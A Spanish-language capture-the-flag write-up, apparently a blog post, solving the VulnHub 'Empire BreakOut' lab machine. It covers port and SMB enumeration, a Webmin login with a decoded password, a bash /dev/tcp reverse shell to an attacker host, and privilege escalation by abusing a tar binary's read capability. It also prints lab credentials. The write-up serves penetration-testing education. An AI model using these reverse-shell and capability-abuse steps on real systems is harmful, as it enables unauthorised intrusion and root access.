---
title: VulnHub Empire BreakOut
author: k4miyo
date: 2022-04-02
math: true
mermaid: true
image:
  path: /assets/images/vulnhub/vulnhub.png
categories: [Easy, Linux]
tags: [Webmin, Capabilities]
ping: true
---

## Empire BreakOut
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.0.0.28 (la cual obtenemos al ejecutar el comando `netdiscover`).

```bash
❯ netdiscover
 Currently scanning: 192.168.14.0/16   |   Screen View: Unique Hosts                                                             
                                                                                                                                
 8 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 480
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.0.28       00:0c:29:3d:7a:ce      1      60  VMware, Inc.
```

```bash
❯ ping -c 1 10.0.0.28
PING 10.0.0.28 (10.0.0.28) 56(84) bytes of data.
64 bytes from 10.0.0.28: icmp_seq=1 ttl=64 time=0.572 ms

--- 10.0.0.28 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.572/0.572/0.572/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.0.0.28 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 00:28 CST
Initiating ARP Ping Scan at 00:28
Scanning 10.0.0.28 [1 port]
Completed ARP Ping Scan at 00:28, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:28
Scanning 10.0.0.28 [65535 ports]
Discovered open port 139/tcp on 10.0.0.28
Discovered open port 80/tcp on 10.0.0.28
Discovered open port 445/tcp on 10.0.0.28
Discovered open port 20000/tcp on 10.0.0.28
Discovered open port 10000/tcp on 10.0.0.28
Completed SYN Stealth Scan at 00:28, 6.28s elapsed (65535 total ports)
Nmap scan report for 10.0.0.28
Host is up (0.00090s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
20000/tcp open  dnp
MAC Address: 00:0C:29:3D:7A:CE (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┼──────────────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 131 B
───────┼──────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.0.0.28
   5   │     [*] Open ports: 80,139,445,10000,20000
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p80,139,445,10000,20000 10.0.0.28 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 00:29 CST
Nmap scan report for 10.0.0.28
Host is up (0.00029s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-server-header: MiniServ/1.981
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows
MAC Address: 00:0C:29:3D:7A:CE (VMware)

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2022-04-02T06:29:11
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.75 seconds
```

Vemos el puerto 445 abierto, por lo tanto vamos a ver si podemos conectarnos con una ***Null Session***.

```bash
❯ smbclient -L 10.0.0.28 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.0.0.28 -u ''
[+] IP: 10.0.0.28:445   Name: 10.0.0.28                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.13.5-Debian)
```

No tenemos permisos en los directorios que se muestran. Por lo tanto, vamos ahora con los servicios HTTP y como siempre primero vamos a lanzar un `whatweb`:

```bash
❯ whatweb http://10.0.0.28/
http://10.0.0.28/ [200 OK] Apache[2.4.51], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[10.0.0.28], Title[Apache2 Debian Default Page: It works]
❯ whatweb http://10.0.0.28:10000
http://10.0.0.28:10000 [200 OK] Country[RESERVED][ZZ], HTTPServer[MiniServ/1.981], IP[10.0.0.28], Title[200 &mdash; Document follows]
❯ whatweb http://10.0.0.28:20000
http://10.0.0.28:20000 [200 OK] Country[RESERVED][ZZ], HTTPServer[MiniServ/1.830], IP[10.0.0.28], Title[200 &mdash; Document follows]
```

No vemos nada interesante, así que vamos a ver el contenido vía web.

![""](/assets/images/vh-empirebreakout/empire-web.png)

![""](/assets/images/vh-empirebreakout/empire-web1.png)

![""](/assets/images/vh-empirebreakout/empire-web2.png)

No vemos nada interesante, así que checaremos el código fuente de las páginas.

![""](/assets/images/vh-empirebreakout/empire-web3.png)

Por el puerto 80 vemos hasta el final del código fuente un comentario en donde se nos comparte una contraseña, la cual se encuentra cifrada en [Brainfuck](https://es.wikipedia.org/wiki/Brainfuck). Por lo tanto, podemos utilizar el recurso online [dcode](https://www.dcode.fr/brainfuck-language).

![""](/assets/images/vh-empirebreakout/empire-web4.png)

Tenemos una contraseña pero desconocemos para que usuario; por lo tanto vamos a tratar de descubrir usuarios a través del servicio SMB mediante el uso de la herramienta `enum4linux`:

```bash
❯ enum4linux 10.0.0.28                                          
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr  2 00:46:56 2022
                                                                
 ==========================                                     
|    Target Information    |                                    
 ==========================                                     
Target ........... 10.0.0.28                                    
RID Range ........ 500-550,1000-1050                                                                                             
Username ......... ''                                                                                                            
Password ......... ''                                                                                                            
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
                                                                                                                                 
                                                                                                                                 
 =================================================                                                                               
|    Enumerating Workgroup/Domain on 10.0.0.28    |
 ================================================= 
[+] Got domain/workgroup name: WORKGROUP                        
                                                                
 ========================================= 
|    Nbtstat Information for 10.0.0.28    |
 =========================================                                                                                       
Looking up status of 10.0.0.28                                  
        BREAKOUT        <00> -         B <ACTIVE>  Workstation Service
        BREAKOUT        <03> -         B <ACTIVE>  Messenger Service                                                             
        BREAKOUT        <20> -         B <ACTIVE>  File Server Service                                                           
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser                                                                
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser   
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
                                                                                                                                 
        MAC Address = 00-00-00-00-00-00                         
                                                                
 ==================================                                                                                              
|    Session Check on 10.0.0.28    |                                                                                             
 ==================================                                                                                              
[+] Server 10.0.0.28 allows sessions using username '', password ''                                                              
                                                                                                                                 
 ========================================                                                                                        
|    Getting domain SID for 10.0.0.28    |                                                                                       
 ========================================                                                                                        
Domain Name: WORKGROUP                                                                                                           
Domain Sid: (NULL SID)                                                                                                           
[+] Can't determine if host is part of domain or part of a workgroup
 ===================================                                                                                             
|    OS information on 10.0.0.28    |                                                                                            
 ===================================                                                                                             
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.                                  
[+] Got OS info for 10.0.0.28 from smbclient:                                                                                    
[+] Got OS info for 10.0.0.28 from srvinfo:                                                                                      
        BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ========================== 
|    Users on 10.0.0.28    |
 ========================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ====================================== 
|    Share Enumeration on 10.0.0.28    |
 ====================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.0.0.28
//10.0.0.28/print$      Mapping: DENIED, Listing: N/A
//10.0.0.28/IPC$        [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ================================================= 
|    Password Policy Information for 10.0.0.28    |
 ================================================= 


[+] Attaching to 10.0.0.28 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BREAKOUT
        [+] Builtin

[+] Password Info for Domain: BREAKOUT

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =========================== 
|    Groups on 10.0.0.28    |
 =========================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ==================================================================== 
|    Users on 10.0.0.28 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1683874020-4104641535-3793993001
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cyber (Local User)
```

Encontramos el usuario **cyber** y tenemos paneles de login por los puertos 10000 y 20000 del ***Webmin***.

![""](/assets/images/vh-empirebreakout/empire-web5.png)

![""](/assets/images/vh-empirebreakout/empire-web6.png)

Vamos a tratar de loguearnos con las credenciales que contamos **cyber : .2uqPEfj3D<P'a-3** en ambos paneles a ver en cual podemos acceder y vemos que podemos acceder al servicio está corriendo por el puerto 20000.

![""](/assets/images/vh-empirebreakout/empire-web7.png)

Si investigamos un poco dentro del panel, vemos que existe un item que nos permte ejecutar comandos a nivel de sistema.

![""](/assets/images/vh-empirebreakout/empire-web8.png)

![""](/assets/images/vh-empirebreakout/empire-web9.png)

Ahora, vamos a tratar de entablarnos una reverse shell a una máquina de atacante. Por lo tanto, nos ponemos en escucha por el puerto 443:

```bash
[cyber@breakout ~] bash -i >& /dev/tcp/10.0.0.25/443 0>&1
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.0.25] from (UNKNOWN) [10.0.0.28] 56686
bash: cannot set terminal process group (999): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$ whoami
whoami
cyber
cyber@breakout:~$
```

Como siempre, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Ya dentro de la máquina somos el usuario **cyber** y podemos visualizar la flag (user.txt). Si checamos nuestro directorio personal, vemos el binario `tar`, el cual podría tratarse de una pista.

```bash
cyber@breakout:~$ ls -l
total 524
-rwxr-xr-x 1 root  root  531928 Oct 19 15:40 tar
-rw-r--r-- 1 cyber cyber     48 Oct 19 14:31 user.txt
cyber@breakout:~$
```

Si checamos las capabilities del binario, vemos que tiene `cap_dac_read_search=ep`:

```bash
cyber@breakout:~$ getcap tar
tar cap_dac_read_search=ep
cyber@breakout:~$
```

Esto nos permite tener permisos de lectura a cualquier archivo; lo que nos permitiría crear un archivo comprimido de cualquier archivo del sistema para posteriormente descomprimir y tener los permisos del usuario **cyber**. Por lo tanto, podriamos tratar de pensar que existe un archivo que tenga información que nos ayude a convertirnos en **root**. Si buscamos un poco, encontramos un recurso interesante en `/var/backups`:

```bash
cyber@breakout:/$ find -name ".*" -print 2>/dev/null | grep -v -E "sys|etc|run"
.
./home/cyber/.tmp
./home/cyber/.tmp/.theme_Nzg2ZTc0MjFmZGY4_usermin_tree_cyber
./home/cyber/.tmp/.theme_ZmNhNzIwNWY1MWQw_usermin_tree_cyber
./home/cyber/.spamassassin
./home/cyber/.gnupg
./home/cyber/.bash_history
./home/cyber/.filemin
./home/cyber/.profile
./home/cyber/.bashrc
./home/cyber/.usermin
./home/cyber/.bash_logout
./home/cyber/.local
./usr/share/dictionaries-common/site-elisp/.nosearch
./usr/share/webmin/smf/images/.del-left.gif-Dec-05-04
./var/backups/.old_pass.bak
./tmp/.webmin
./tmp/.ICE-unix
./tmp/.XIM-unix
./tmp/.Test-unix
./tmp/.font-unix
./tmp/.X11-unix
cyber@breakout:/$
cyber@breakout:/$ cd /var/backups/
cyber@breakout:/var/backups$ ls -la
total 28
drwxr-xr-x  2 root root  4096 Apr  1 23:51 .
drwxr-xr-x 14 root root  4096 Oct 19 13:48 ..
-rw-r--r--  1 root root 12732 Oct 19 15:56 apt.extended_states.0
-rw-------  1 root root    17 Oct 20 07:49 .old_pass.bak
cyber@breakout:/var/backups$
```

El recurso `.old_pass.bak` tiene permisos sólo de **root**, pero podemos comprimirlo con el binario `tar` en nuestro directorio personal y luego descomprimirlo.

```bash
cyber@breakout:/var/backups$ /home/cyber/tar -cf /home/cyber/backup.tar .old_pass.bak 
cyber@breakout:/var/backups$ cd /home/cyber/
cyber@breakout:~$ ls -l
total 536
-rw-r--r-- 1 cyber cyber  10240 Apr  2 03:15 backup.tar
-rwxr-xr-x 1 root  root  531928 Oct 19 15:40 tar
-rw-r--r-- 1 cyber cyber     48 Oct 19 14:31 user.txt
cyber@breakout:~$
```

Descomprimirmos el archivo:

```bash
cyber@breakout:~$ ./tar -xf backup.tar 
cyber@breakout:~$ ls -la
total 584
drwxr-xr-x  8 cyber cyber   4096 Apr  2 03:16 .
drwxr-xr-x  3 root  root    4096 Oct 19 08:24 ..
-rw-r--r--  1 cyber cyber  10240 Apr  2 03:15 backup.tar
-rw-------  1 cyber cyber      0 Oct 20 07:52 .bash_history
-rw-r--r--  1 cyber cyber    220 Oct 19 08:24 .bash_logout
-rw-r--r--  1 cyber cyber   3526 Oct 19 08:24 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19 14:06 .filemin
drwx------  2 cyber cyber   4096 Oct 19 14:00 .gnupg
drwxr-xr-x  3 cyber cyber   4096 Oct 19 14:29 .local
-rw-------  1 cyber cyber     17 Oct 20 07:49 .old_pass.bak
-rw-r--r--  1 cyber cyber    807 Oct 19 08:24 .profile
drwx------  2 cyber cyber   4096 Oct 19 13:59 .spamassassin
-rwxr-xr-x  1 root  root  531928 Oct 19 15:40 tar
drwxr-xr-x  2 cyber cyber   4096 Oct 20 07:52 .tmp
drwx------ 16 cyber cyber   4096 Oct 19 14:26 .usermin
-rw-r--r--  1 cyber cyber     48 Oct 19 14:31 user.txt
cyber@breakout:~$
```

Ahora si tenemos permisos de lectura y escritura del archivo `.old_pass.bak`:

```bash
cyber@breakout:~$ cat .old_pass.bak
Ts&4&YurgtRX(=~h
cyber@breakout:~$
```

Tenemos una contraseña la cual podría tratarse del usuario **root**:

```bash
cyber@breakout:~$ su root
Password: 
root@breakout:/home/cyber# whoami
root
root@breakout:/home/cyber#
```

Ya somos el usuario **root** y podemos visualizar la flag (r00t.txt).
